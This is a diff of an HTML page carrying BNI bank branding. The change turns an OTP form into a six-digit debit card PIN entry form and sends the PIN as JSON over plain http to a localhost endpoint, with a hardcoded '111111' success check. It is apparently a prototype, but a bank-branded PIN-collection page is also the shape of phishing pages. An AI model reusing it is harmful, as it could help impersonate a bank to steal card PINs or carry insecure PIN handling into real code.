@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Confirm OTP</title>
+    <title>Binding - Input PIN</title>
+    <link rel="shortcut icon" type="image/x-icon" href="./images/plain-logo.svg" />
     <style>
         *{
             padding: 0;
@@ -53,16 +55,16 @@
             margin-bottom: 32px;
         }
         
-        #otp-form{
+        #pin-form{
             display: flex;
             justify-content: center;
             margin-bottom: 20px;
             margin-top: 20px;
         }
 
-        #otp-form > input{
+        #pin-form > input{
             height: 55px;
-            width: 45px;
+            max-width: 40px;
             margin-right: 8px;
             border-radius: 8px;
             font-size: 32px;
@@ -71,15 +73,19 @@
             color: #FF8736;
         }
         
-        #otp-form > input:focus{
+        #pin-form > input:focus{
             border: 2px solid #FF8736;
             box-shadow: none;
             background: none;
             outline: none;
         }
         
-        #otp-form > input:valid{
+        #pin-form > input:valid{
             border: 2px solid #FF8736;
+        }
+
+        #pin-form > input:last-child{
+            margin-right: 0;
         }
 
         .timeout-otp{
@@ -109,11 +115,46 @@
             border-radius: 24px;
         }
 
-        #submitButton > button:hover,
-        #submitButton > button:focus {
+        #submitButton > button:hover{
             cursor: pointer;
             color: rgb(227, 219, 219);
             background-color: #df7b38;
+        }
+
+        #loadingIcon{
+            display: none;
+        }
+        
+        #loadingIcon > img{
+            animation: flipAnimation 5s infinite linear;
+        }
+
+        @keyframes flipAnimation {
+            100% {transform: rotate(360deg);}
+        }
+
+        /* responsive hand phone */
+        @media only screen and (max-width: 600px) {
+            body{
+                padding: 24px;
+            }
+
+            #logo{
+                margin-top: 24px;
+                margin-bottom: 24px;
+            }
+
+            #form{
+                padding: 0;
+            }
+
+            #illustration{
+                margin-bottom: 24px;
+            }
+            
+            .timeout-otp{
+                margin-bottom: 20px;
+            }
         }
     </style>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
@@ -121,16 +162,16 @@
 <body>
     <div id="header">
         <div id="logo">
-            <img src="./images/logo_bni.png">
+            <img src="./images/Logo BNI - Primary.svg">
         </div>
         <div id="illustration">
             <img src="./images/hand-phone.svg">
         </div>
     </div>
     <div id="formContainer">
-        <form id="form" autocomplete="off" action="./success.html">
-            <h1>Masukkan PIN Karu Debit Anda</h1>
-            <div id="otp-form">
+        <form id="form" autocomplete="off">
+            <h1>Masukkan PIN Kartu Debit Anda</h1>
+            <div id="pin-form">
                 <input type="password" id="digit-1" name="digit-1" data-next="digit-2" required/>
                 <input type="password" id="digit-2" name="digit-2" data-next="digit-3" data-previous="digit-1" required/>
                 <input type="password" id="digit-3" name="digit-3" data-next="digit-4" data-previous="digit-2" required/>
@@ -139,13 +180,16 @@
                 <input type="password" id="digit-6" name="digit-6" data-previous="digit-5" required/>
             </div>
             <div id="submitButton">
-                <button type="submit">Kirim</button>
+                <button type="submit" id="submitForm">
+                    <span id="loadingIcon"><img src="./images/loader.svg"></span>
+                    <span id="buttonText">Lanjutkan</span>
+                </button>
             </div>
         </form>
     </div>
     <script>
         $(document).ready(function(){
-            $('#otp-form').find('input').each(function() {
+            $('#pin-form').find('input').each(function() {
                 $(this).attr('maxlength', 1);
                 $(this).on('keyup', function(e) {
                     var parent = $($(this).parent());
@@ -169,6 +213,41 @@
                     }
                 });
             });
+
+            $("#form").on("submit", function(e){
+                e.preventDefault();
+                
+                let digit1 = $("#digit-1").val();
+                let digit2 = $("#digit-2").val();
+                let digit3 = $("#digit-3").val();
+                let digit4 = $("#digit-4").val();
+                let digit5 = $("#digit-5").val();
+                let digit6 = $("#digit-6").val();
+
+                let data = {
+                    "pin": "" + digit1 + digit2 + digit3 + digit4 + digit5 + digit6
+                }
+
+                $("#buttonText").hide()
+                $("#loadingIcon").show()
+                $("#submitForm").attr("disabled", true);                   
+                $.ajax({
+                    type: 'post',
+                    url: 'http://localhost:8080/pin',
+                    data: JSON.stringify(data),
+                    contentType: "application/json; charset=utf-8",
+                    success: function (data) {
+                        $("#loadingIcon").hide()
+                        $("#buttonText").show()
+                        
+                        if(data["pin"] == '111111'){
+                            location.href = "http://127.0.0.1:5500/success.html"
+                        }
+
+                    }
+                });
+                $("#submitForm").attr("disabled", false);
+            })
         })
     </script>
 </body>
